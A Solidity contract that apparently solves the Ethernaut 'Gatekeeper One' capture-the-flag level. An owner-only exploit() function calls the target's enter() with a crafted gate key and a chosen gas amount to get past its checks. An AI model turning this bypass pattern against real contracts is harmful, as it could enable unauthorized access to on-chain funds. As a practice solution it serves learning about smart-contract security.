// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IGatekeeperOne } from "ethernaut/13-gatekeeper-one/IGatekeeperOne.sol";

contract GatekeeperOneAttacker is Ownable2Step {
    function exploit(address _gatekeeperOneAddr, bytes8 _gateKey, uint256 _gas) external onlyOwner returns (bool) {
        // NB: minimalistic version
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = _gatekeeperOneAddr.call{gas: _gas}(abi.encodeCall(IGatekeeperOne.enter, (_gateKey)));
        return success;
    }
}
